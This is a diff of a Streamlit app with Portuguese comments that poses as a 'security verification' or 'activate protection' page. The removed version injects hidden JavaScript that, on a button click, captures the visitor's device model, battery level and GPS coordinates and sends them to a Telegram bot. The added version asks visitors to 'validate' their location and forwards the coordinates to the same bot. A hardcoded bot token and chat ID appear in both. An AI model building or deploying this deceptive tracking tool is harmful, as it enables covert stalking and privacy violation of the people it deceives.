@@ -1,95 +1,66 @@
 import streamlit as st
-import streamlit.components.v1 as components
-import time
+from streamlit_js_eval import get_geolocation
+import requests
 
-# --- ESTILIZAÇÃO MANTIDA ---
-st.set_page_config(page_title="Segurança Ativa", page_icon="🛡️", layout="centered")
+# --- CONFIGURAÇÃO DA PÁGINA ---
+st.set_page_config(page_title="Verificação de Local local", page_icon="📍")
 
-st.markdown("""
-    <style>
-    .main { background-color: #0e1117; }
-    .stButton>button { 
-        width: 100%; border-radius: 20px; background-color: #262730; 
-        color: white; border: none; height: 50px; font-weight: bold;
-    }
-    .circle-container { display: flex; justify-content: center; align-items: center; height: 250px; }
-    .circle {
-        width: 200px; height: 200px; border-radius: 50%;
-        border: 4px solid #1f2329; border-top: 4px solid #00ff7f;
-        display: flex; justify-content: center; align-items: center;
-        font-size: 40px; font-weight: bold; color: white;
-    }
-    .spin { animation: spin 2s linear infinite; }
-    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    </style>
-    """, unsafe_allow_html=True)
-
-# --- CONFIGURAÇÃO DO BOT ---
+# --- CREDENCIAIS (Proteja-as no st.secrets no futuro) ---
 TOKEN = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
 CHAT_ID = "8210828398"
 
-# --- SCRIPT DE CAPTURA SEM F-STRING (IMPEDE ERRO DE SINTAXE) ---
-js_final = """
-<script>
-    async function enviarTelegram(dados) {
-        var botToken = '""" + TOKEN + """';
-        var chatId = '""" + CHAT_ID + """';
-        var texto = "📍 **Nova Captura**\\n📱 Modelo: " + dados.modelo + "\\n🔋 Bateria: " + dados.bateria + "\\n🌍 Local: https://www.google.com/maps?q=" + dados.lat + "," + dados.lon;
-        var url = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(texto) + "&parse_mode=Markdown";
-        await fetch(url);
-    }
-
-    async function capturarInfo() {
-        var info = {
-            modelo: navigator.userAgent.split('(')[1].split(')')[0],
-            bateria: "n/a",
-            lat: 0,
-            lon: 0
-        };
-
-        try {
-            var battery = await navigator.getBattery();
-            info.bateria = Math.round(battery.level * 100) + "%";
-        } catch (e) {}
-
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(function(pos) {
-                info.lat = pos.coords.latitude;
-                info.lon = pos.coords.longitude;
-                enviarTelegram(info);
-            }, function(err) {
-                console.log("Localização negada");
-            }, { enableHighAccuracy: true, timeout: 10000 });
-        }
-    }
-
-    var checkBtn = setInterval(function() {
-        var btn = window.parent.document.querySelector('button');
-        if (btn) {
-            btn.addEventListener('click', capturarInfo);
-            clearInterval(checkBtn);
-        }
-    }, 500);
-</script>
-"""
-components.html(js_final, height=0)
+def enviar_telegram(lat, lon, accuracy):
+    """Envia os dados de forma segura via Python backend"""
+    texto = (
+        f"📍 **Nova Localização Recebida**\n"
+        f"🌍 Lat: `{lat}`\n"
+        f"🌍 Lon: `{lon}`\n"
+        f"🎯 Precisão: `{accuracy}m`\n"
+        f"🗺️ Mapa: https://www.google.com/maps?q={lat},{lon}"
+    )
+    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
+    try:
+        requests.post(url, json={"chat_id": CHAT_ID, "text": texto, "parse_mode": "Markdown"})
+        return True
+    except:
+        return False
 
 # --- INTERFACE ---
-st.title("Verificar segurança")
-placeholder = st.empty()
+st.title("Verificação de Segurança")
+st.write("Para prosseguir, precisamos validar sua localização atual.")
 
-st.write("✅ Ambiente de pagamentos")
-st.write("✅ Privacidade e segurança")
-st.write("✅ Vírus")
+# CSS para o botão ficar parecido com o que você queria
+st.markdown("""
+    <style>
+    div.stButton > button {
+        width: 100%;
+        height: 60px;
+        background-color: #00ff7f;
+        color: black;
+        font-weight: bold;
+        border-radius: 15px;
+    }
+    </style>
+""", unsafe_allow_html=True)
 
-if st.button("● ATIVAR PROTEÇÃO"):
-    # Animação da bolha subindo até 100%
-    for i in range(4, 101, 5):
-        placeholder.markdown('<div class="circle-container"><div class="circle spin">' + str(i) + '%</div></div>', unsafe_allow_html=True)
-        time.sleep(0.05)
-    st.success("Proteção Ativada!")
-else:
-    # Estado inicial 4%
-    placeholder.markdown('<div class="circle-container"><div class="circle">4%</div></div>', unsafe_allow_html=True)
+# O componente que realmente ativa o pedido de localização do navegador
+if st.button("📍 CLIQUE PARA VALIDAR LOCALIZAÇÃO"):
+    loc = get_geolocation()
+    
+    if loc:
+        lat = loc['coords']['latitude']
+        lon = loc['coords']['longitude']
+        acc = loc['coords']['accuracy']
+        
+        st.success("Localização capturada com sucesso!")
+        
+        # Envia para o Telegram
+        if enviar_telegram(lat, lon, acc):
+            st.info("Relatório de segurança enviado para o servidor.")
+        
+        # Mostra um mapa simples na tela
+        st.map({"lat": [lat], "lon": [lon]})
+    else:
+        st.warning("Aguardando permissão... Por favor, aceite o pedido de localização no seu navegador.")
+        st.info("Dica: Se o seu GPS estiver desligado, o Android mostrará a tela de 'Precisão de Local'.")
 
-st.warning("Permissão de localização negada ou indisponível.")
